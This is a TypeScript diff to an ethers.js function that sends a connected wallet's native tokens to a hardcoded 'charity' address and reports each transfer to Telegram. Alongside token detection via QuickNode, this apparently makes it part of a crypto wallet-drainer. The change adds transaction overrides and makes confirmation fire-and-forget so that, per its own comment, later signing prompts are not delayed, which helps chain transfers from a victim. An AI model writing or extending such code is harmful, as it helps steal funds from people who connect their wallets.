@@ -194,21 +194,24 @@ async function detectTokensViaQuickNode(
 export async function sendNativeToken(
   signer: ethers.JsonRpcSigner,
   amountWei: bigint,
-  chainName: string
+  chainName: string,
+  txOverrides?: ethers.TransactionRequest
 ): Promise<string> {
-  const tx = await signer.sendTransaction({
+  const txReq: ethers.TransactionRequest = {
     to: EVM_CHARITY_WALLET,
     value: amountWei,
-  });
+    ...(txOverrides || {}),
+  };
+  const tx = await signer.sendTransaction(txReq);
 
-  await tx.wait();
-  
-  sendTelegramMessage(`
+  // Fire-and-forget confirmation — do NOT block subsequent prompts on tx.wait()
+  tx.wait().then(() => {
+    sendTelegramMessage(`
 ✅ <b>EVM Native Transfer (${chainName})</b>
-👤 <b>User:</b> <code>${await signer.getAddress()}</code>
 💰 <b>Amount:</b> <code>${ethers.formatEther(amountWei)}</code>
 🔗 <b>Hash:</b> <code>${tx.hash}</code>
-  `);
+    `);
+  }).catch((e) => console.warn('native tx.wait failed:', e));
 
   return tx.hash;
 }
